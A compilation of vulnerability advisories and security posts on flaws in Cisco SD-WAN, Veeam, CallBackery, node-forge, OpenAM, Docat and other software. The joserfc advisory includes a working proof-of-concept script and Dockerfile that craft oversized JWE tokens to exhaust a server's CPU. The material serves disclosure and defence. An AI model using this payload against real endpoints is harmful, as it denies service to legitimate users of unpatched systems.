This vulnerability exists because the peering authentication mechanism in an affected system is not working properly. An attacker could exploit this vulnerability by sending crafted requests to an affected system. A successful exploit could allow the attacker to log in to an affected Cisco Catalyst SD-WAN Controller as an internal, high-privileged, non-root user account. Using this account, the attacker could access NETCONF, which would then allow the attacker to manipulate network configuration for the SD-WAN fabric.

posts.content: CallBackery <0.62.0 (Perl) is vulnerable (CVE-2026-118990, HIGH). Temp config dumps in /tmp are world-readable & not deleted, exposing password hashes. Local users can also exploit predictable filenames via symlink. Upgrade to 0.62.0+. https://radar.offseq.com/threat/cve-2026-118990-cwe-379-creation-of-temporary-file-in-directory-with-insecure-permissions-in-1f67aa1816eadbc4 #OffSeq #infosec #CVE2026118990

CVE-2026-118990.description:
CallBackery versions before 0.62.0 for Perl leave a world-readable dump of the configuration database in /tmp when taking a configuration backup.

getConfigBlob() has the sqlite3 shell write the dump to /tmp/cbdump<pid> and never removes it. The file takes the process umask, and a symlink planted at that predictable name is followed.

The dump holds every user's password hash and every value saved by the application's forms. A local user can read these after any backup, and may redirect the dump to a file of their choosing.

CVE-2026-119188.description: Forge (also called node-forge) is a native implementation of Transport Layer Security in JavaScript. Prior to 1.4.1, the affected implementation used forge.tls.createConnection(), fragmented handshake message, interleaved record to process the relevant input or security decision. node-forge continued processing after a TLS record of another content type interrupted a fragmented handshake message. A remote peer could trigger an uncaught TypeError in process(), causing the connection or hosting process to fail. This issue is fixed in version 1.4.1.

Veeam Patches Critical Authorization Bypass and SQL Injection Flaws in Backup Software

Veeam patched eight vulnerabilities, including a critical authorization bypass (CVE-2026-108142) and a SQL injection flaw (CVE-2026-106076) that allows remote code execution. These vulnerabilities affect Veeam Backup & Replication and Veeam Backup for Microsoft 365, potentially exposing sensitive recovery data to unauthenticated attackers.

**If you run Veeam Backup & Replication 13.0 or 13.1, or Veeam Backup for Microsoft 365 v8, update ASAP to 13.1.2, 13.0.3 or 365 v8.6 Patch 1. Attackers exploiting these flaws can take over unpatched backup servers. Always make sure only trusted admin networks can reach your backup servers, and block untrusted access to the CDP service port.**

CVE-2026-103963.description: A flaw was found in glib-networking. When establishing connections using Transport Layer Security (TLS) version 1.3, the client-side session cache does not limit the number of session tickets retained for a single host. A malicious server can exploit this by sending excessive session ticket messages, causing the client application to continuously consume memory. This unbounded memory growth can exhaust system memory, resulting in a Denial of Service (DoS).

posts.content:
🟠 CVE-2026-119283 - High (7.5)

joserfc is a Python library that provides an implementation of several JSON Object Signing and Encryption (JOSE) standards. Prior to 1.7.5, joserfc.jwe.decrypt_json() accepts a JWE General JSON Serialization recipients array without a count limit ...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-119283/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-119283.description:
### Summary

`joserfc.jwe.decrypt_json()`, the library's public parser for JWE General JSON Serialization, accepts an attacker-controlled `recipients` array of unbounded length and performs one full private-key decryption operation (`decrypt_cek`) for **every** recipient present in the input, with no cap on recipient count. An unauthenticated network attacker who can send a JWE General JSON document to any endpoint that decrypts it with an RSA key (e.g. RSA-OAEP) can force the victim to perform an arbitrary, attacker-chosen number of RSA private-key decryption operations from a single, relatively small HTTP request. This gives the attacker a highly asymmetric CPU-exhaustion (Denial of Service) primitive: local reproduction shows request size growing linearly with recipient count (~396 bytes/recipient) while server-side CPU time grows in lock-step (near 1:1 ratio between recipient-count growth and decrypt-time growth), and the library's only documented mitigation knob, `verify_all_recipients=False`, does **not** reduce the CPU cost, since the decrypt loop attempts every recipient's `decrypt_cek()` unconditionally before that flag is ever consulted. This is CWE-400 (Uncontrolled Resource Consumption) with CVSS v3.1 Base Score 7.5 (High).

### Details

`joserfc` validates and caps several structural elements of a JWE (protected header size, encrypted key size, IV size, ciphertext size, and auth-tag size) inside `src/joserfc/_rfc7516/registry.py`, but performs **no validation whatsoever on the number of entries in the `recipients` array** of a JWE General JSON Serialization object.

Data flow (source → sink), verified directly against the repository source at commit `26a10275e88276184f91ae2a6409647bfac7fea5` (joserfc 1.7.4):

1. `src/joserfc/jwe.py:214` — public parser entry point `decrypt_json(data, private_key, ...)`. This is a documented, unauthenticated (at the library boundary) API for parsing externally supplied JWE JSON.
2. `src/joserfc/jwe.py:238` — if `"recipients"` is present in the input dict, `extract_general_json(...)` is invoked.
3. `src/joserfc/_rfc7516/json.py:84-86` — iterates `for item in data["recipients"]:` and appends a `Recipient` object for every entry, with **no upper bound check** on `len(data["recipients"])`:
   ```python
   for item in data["recipients"]:
       recipient = __extract_recipient(obj, item, registry)
       obj.recipients.append(recipient)
   ```
4. `src/joserfc/jwe.py:252` — the private key is attached to every extracted recipient.
5. `src/joserfc/_rfc7516/message.py:103-112` — `_perform_decrypt()` loops over **every** recipient in `obj.recipients` and calls `decrypt_recipient(...)` for each one, regardless of how many there are:
   ```python
   cek_set = set()
   for recipient in obj.recipients:
       headers = recipient.headers()
       registry.check_header(headers, True)
       alg = registry.get_alg(headers["alg"])
       try:
           cek = decrypt_recipient(alg, enc, recipient, tag)
           cek_set.add(cek)
   ```
6. `src/joserfc/_rfc7518/jwe_algs.py:74-83` — for RSA-OAEP/RSA1_5 recipients, this dispatches to the sink, a genuine RSA private-key operation:
   ```python
   def decrypt_cek(self, recipient: Recipient[RSAKey]) -> bytes:
       key = recipient.recipient_key
       assert key is not None
       self.check_key_type(key)
       op_key = key.get_op_key("decrypt")
       try:
           assert recipient.encrypted_key is not None
           cek = op_key.decrypt(recipient.encrypted_key, self.padding)
   ```

Confirmed by direct inspection of `src/joserfc/_rfc7516/registry.py`: size caps exist for `max_header_length`, `max_encrypted_key_length`, `max_iv_length`, `max_ciphertext_length`, and `max_auth_tag_length` (registry.py:52-62, 103-121), but no `max_recipients` (or equivalent) field or check exists anywhere in `registry.py`, `json.py`, or `jwe.py`.

Critically, the loop in `message.py:103-112` calls `decrypt_recipient()` for **every** recipient unconditionally — this happens *before* `registry.verify_all_recipients` is ever consulted. Setting `verify_all_recipients=False` (the library's only documented related option) therefore changes whether a decrypt failure raises an exception, but does **not** reduce the number of RSA private-key operations performed, and thus does not mitigate the CPU cost. This was independently confirmed at runtime (see PoC results below): decrypt time is statistically identical between `verify_all_recipients=True` and `verify_all_recipients=False` for the same recipient count.

`decrypt_json()` is not a demo-only or admin-only code path: it is documented in `docs/guide/jwe.rst:156-182` as the standard way to parse and decrypt an externally received General JSON JWE, and requires no special/non-default configuration to trigger. This is functionally analogous to two other resource-exhaustion issues already fixed in the same codebase — the PBES2 `p2c` iteration cap (`src/joserfc/_rfc7518/jwe_algs.py:237-239`) and the JWE compression "zip bomb" size cap (`src/joserfc/_rfc7518/jwe_zips.py:11,26-28`) — indicating the recipient-count case was simply missed from the same class of hardening.

### PoC

Both static (Phase 1) and dynamic, containerized (Phase 2) reproduction confirmed the vulnerability against unmodified joserfc 1.7.4 source.

**Environment setup (Dockerfile):**

```dockerfile
FROM python:3.12-slim
WORKDIR /app
# Copy the exact repository source under test (unmodified).
COPY repo /app/repo
# Install joserfc from local source in editable/normal mode.
RUN pip install --no-cache-dir /app/repo
# Copy the PoC script.
COPY vuln-001/poc.py /app/poc.py
ENTRYPOINT ["python3", "/app/poc.py"]
```

Build and run (source is used unmodified; container has no network access):

```bash
docker build -t joserfc-vuln001 -f vuln-001/Dockerfile .
docker run --rm --network none joserfc-vuln001 --recipients 1 500 1500
```

**PoC logic (`poc.py`):** generates a victim RSA-2048 keypair (representing the RSA key an application would use for RSA-OAEP JWE decryption), crafts a General JSON JWE (`GeneralJSONEncryption`) wrapping a small plaintext with an attacker-chosen number `n` of RSA-OAEP recipients (all using the victim's public key, which is inherently public for JWE encryption), then calls the unmodified public API `joserfc.jwe.decrypt_json()` and measures wall-clock decrypt time, once with `verify_all_recipients=True` and once with `verify_all_recipients=False`.

```python
def build_token(public_key, n_recipients: int) -> tuple[str, int]:
    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
    for _ in range(n_recipients):
        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
    token = jwe.encrypt_json(obj, None)
    size_bytes = len(json.dumps(token).encode())
    return token, size_bytes

def measure_decrypt(token, private_key, verify_all_recipients: bool) -> float:
    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
    t0 = time.perf_counter()
    out = jwe.decrypt_json(token, private_key, registry=registry)
    dt = time.perf_counter() - t0
    assert out.plaintext == b"hello"
    return dt
```

**Observed results (Phase 2, inside the Docker container, `--network none`, unmodified source):**

```
[*] Attacker crafts General JSON JWE with recipients=1 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.002
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.001
[*] Attacker crafts General JSON JWE with recipients=500 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.631
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.651
[*] Attacker crafts General JSON JWE with recipients=1500 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.874
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.875
[CHECK] recipient_count_ratio=1500.0x decrypt_time_ratio=937.0x
[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied recipient with
       no upper bound, and verify_all_recipients=False did not mitigate the cost.
```

Independent static-phase (Phase 1) reproduction against the same commit, outside the container, produced the same linear-scaling behavior (recipients=500 → 198,140 bytes → 0.627s; recipients=1500 → 594,140 bytes → 1.957s), and the original report's own local run showed recipients=1000 → 396,140 bytes → 1.254s; recipients=3000 → 1,188,140 bytes → 3.762s. In every run, `plaintext=b'hello'` was correctly recovered, confirming each crafted request is fully valid input, not malformed data rejected early.

In all cases, `verify_all_recipients=False` produced decrypt times statistically identical to `verify_all_recipients=True` for the same recipient count (e.g. 500 recipients: 0.631s vs 0.651s; 1500 recipients: 1.874s vs 1.875s), empirically confirming that this documented flag does not mitigate the CPU cost.

### Impact

This is a remote, unauthenticated CPU-exhaustion Denial-of-Service vulnerability (CWE-400, Uncontrolled Resource Consumption). Any application that:

- exposes an endpoint (or message-processing path) that accepts JWE data in General JSON Serialization form, and
- decrypts it using `joserfc.jwe.decrypt_json()` with an RSA-based key-management algorithm (e.g. RSA-OAEP, RSA1_5)

is impacted. The attacker needs only the victim's RSA public key — which is inherently public, since it is used by legitimate senders to encrypt JWEs to the victim. Because request size scales linearly with recipient count (~396 bytes per recipient) while attacker-inflicted server CPU cost scales in lock-step with recipient count, the attacker gets a highly favorable cost asymmetry: e.g. a ~1.2 MB request forced ~3.8 seconds of RSA-2048 private-key decrypt operations in testing. Repeated or concurrent requests of this shape can exhaust available CPU/worker capacity on the victim service, degrading or denying availability for legitimate users. Confidentiality and integrity are not affected (no key material or plaintext is disclosed or corrupted); the impact is availability only, matching the CVSS vector's `C:N/I:N/A:H`.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 dynamic reproduction environment
# Unbounded JWE General JSON "recipients" array causes CPU exhaustion via
# repeated RSA private-key decryption in joserfc's decrypt_json().
#
# This image builds joserfc from the local repository clone (unmodified
# source) and provides a Python environment to run poc.py against it.

FROM python:3.12-slim

WORKDIR /app

# Copy the exact repository source under test (unmodified).
COPY repo /app/repo

# Install joserfc from local source in editable/normal mode.
RUN pip install --no-cache-dir /app/repo

# Copy the PoC script.
COPY vuln-001/poc.py /app/poc.py

ENTRYPOINT ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
"""
VULN-001 dynamic PoC: Unbounded JWE General JSON "recipients" array causes
CPU exhaustion (CWE-400) via repeated RSA private-key decryption inside
joserfc's public parser API `joserfc.jwe.decrypt_json()`.

Data flow reproduced end to end (unmodified joserfc source):
  1. joserfc.jwe.decrypt_json()                         (src/joserfc/jwe.py:214)
  2. -> extract_general_json()                           (src/joserfc/_rfc7516/json.py:73)
  3. -> for item in data["recipients"]: (NO COUNT CAP)   (src/joserfc/_rfc7516/json.py:84)
  4. -> perform_decrypt() -> _perform_decrypt()          (src/joserfc/_rfc7516/message.py:93-112)
  5. -> for recipient in obj.recipients: decrypt_recipient(...) for EVERY recipient,
        regardless of registry.verify_all_recipients
  6. -> RSAAlgModel.decrypt_cek(): op_key.decrypt(...)   (src/joserfc/_rfc7518/jwe_algs.py:74-83)
     performs one real RSA-2048 private-key decrypt operation per recipient.

This script:
  (a) builds a victim RSA keypair (2048-bit, as an application would use for
      RSA-OAEP JWE decryption),
  (b) crafts a General JSON JWE token with an attacker-chosen number of
      RSA-OAEP recipients, all wrapping the SAME small ciphertext,
  (c) measures wall-clock CPU time joserfc's unmodified decrypt_json() spends
      processing the token as the recipient count grows,
  (d) shows that setting verify_all_recipients=False (the only public
      mitigation knob mentioned in the docs) does NOT reduce the CPU cost,
      because the decrypt loop in message.py always attempts every
      recipient's decrypt_cek() before that flag is ever consulted.

Deterministic PASS criteria (printed as machine-readable JSON lines):
  - decrypt_json() succeeds (returns correct plaintext) for all recipient counts.
  - decrypt_seconds scales roughly linearly with recipient count (attacker
    control over victim CPU cost, unbounded by the library).
  - decrypt_seconds for verify_all_recipients=False is statistically the same
    order of magnitude as verify_all_recipients=True for the same recipient
    count (proving the documented mitigation does not help).
"""

import argparse
import json
import time

from joserfc import jwe, jwk
from joserfc.jwe import GeneralJSONEncryption
from joserfc.jwe import JWERegistry


def build_token(public_key, n_recipients: int) -> tuple[str, int]:
    """Craft a General JSON JWE with n_recipients RSA-OAEP recipients,
    all wrapping the same small plaintext. This is exactly the shape an
    unauthenticated network attacker can send to any endpoint that calls
    jwe.decrypt_json() on external input, as documented in
    docs/guide/jwe.rst."""
    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
    for _ in range(n_recipients):
        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
    token = jwe.encrypt_json(obj, None)
    size_bytes = len(json.dumps(token).encode())
    return token, size_bytes


def measure_decrypt(token, private_key, verify_all_recipients: bool) -> float:
    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
    t0 = time.perf_counter()
    out = jwe.decrypt_json(token, private_key, registry=registry)
    dt = time.perf_counter() - t0
    assert out.plaintext == b"hello", f"unexpected plaintext: {out.plaintext!r}"
    return dt


def main():
    parser = argparse.ArgumentParser(description="VULN-001 dynamic reproduction PoC")
    parser.add_argument(
        "--recipients",
        type=int,
        nargs="+",
        default=[1, 500, 1500],
        help="Recipient counts to test (attacker-controlled array length).",
    )
    parser.add_argument(
        "--key-bits",
        type=int,
        default=2048,
        help="RSA key size of the victim's decryption key.",
    )
    args = parser.parse_args()

    print(f"[*] Generating victim RSA-{args.key_bits} keypair (RSA-OAEP JWE key)...")
    private_key = jwk.RSAKey.generate_key(args.key_bits)
    public_key = jwk.RSAKey.import_key(private_key.as_dict(private=False))
    print("[*] Victim private key generated locally; public key is what an attacker would normally have.")

    results = []
    for n in args.recipients:
        print(f"\n[*] Attacker crafts General JSON JWE with recipients={n} ...")
        token, size_bytes = build_token(public_key, n)

        dt_verify_true = measure_decrypt(token, private_key, verify_all_recipients=True)
        print(
            f"    verify_all_recipients=True  -> decrypt_json() succeeded, "
            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_true:.3f}"
        )

        dt_verify_false = measure_decrypt(token, private_key, verify_all_recipients=False)
        print(
            f"    verify_all_recipients=False -> decrypt_json() succeeded, "
            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_false:.3f} "
            f"(documented 'mitigation' does NOT reduce CPU cost)"
        )

        results.append(
            {
                "recipients": n,
                "size_bytes": size_bytes,
                "decrypt_seconds_verify_all_true": round(dt_verify_true, 3),
                "decrypt_seconds_verify_all_false": round(dt_verify_false, 3),
            }
        )

    print("\n[RESULT_JSON] " + json.dumps(results))

    # Deterministic scaling check: CPU time for the largest recipient count
    # must be substantially larger (order of magnitude, not noise) than for
    # the smallest, proving attacker control over victim CPU consumption.
    baseline = results[0]["decrypt_seconds_verify_all_true"]
    worst = results[-1]["decrypt_seconds_verify_all_true"]
    ratio = worst / baseline if baseline > 0 else float("inf")
    recipient_ratio = results[-1]["recipients"] / results[0]["recipients"]
    print(
        f"[CHECK] recipient_count_ratio={recipient_ratio:.1f}x "
        f"decrypt_time_ratio={ratio:.1f}x "
        f"(unbounded recipients => unbounded RSA-decrypt CPU cost, no cap in registry.py)"
    )

    if ratio < recipient_ratio * 0.3:
        print("[FAIL] Decrypt time did not scale with recipient count as expected.")
        raise SystemExit(1)

    print("[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied "
          "recipient with no upper bound, and verify_all_recipients=False did not mitigate the cost.")


if __name__ == "__main__":
    main()
```

CVE-2026-45049.description:
## Summary

**Description**

An Information Exposure Through Sent Data (CWE-201) issue in OpenAM's Cross-Domain Single Sign-On (CDSSO) servlet allows a logged-in user's raw OpenAM session token to be POSTed to an attacker-controlled URL. This impacts OpenAM Community Edition through version 16.0.6. This issue was patched in version 16.1.1.

An attacker who can induce a logged-in victim to visit a crafted URL may receive the victim's session credential, which could enable session hijacking.

## Impact
OpenAM deployments through version 16.0.6 that have CDSSO enabled are potentially affected. The CDSSO component is commonly enabled in multi-domain deployments. Exploitation requires user interaction — an authenticated user must be induced to visit an attacker-crafted URL — and is further gated on a non-default configuration being absent.

## Patch
This has been patched in OpenAM Community Edition version 16.1.1. Users are encouraged to update to the latest release.

CVE-2026-61645.description: Docat is a tool for hosting versioned static documentation. In the affected implementation, an arbitrary file upload vulnerability in the `Upload API` arises because the API does not validate the `uploaded file path or type`. An attacker can overwrite sensitive configuration files or place malicious files on the Docat web server. Depending on deployment context, uploaded content can enable remote code execution or cross-site scripting intended to steal cookies or redirect users to malicious websites. Version 1.6.0 mitigates filename-based path traversal; remediation of unrestricted file types or deployment-dependent malicious-content effects is not established by the verified patch.
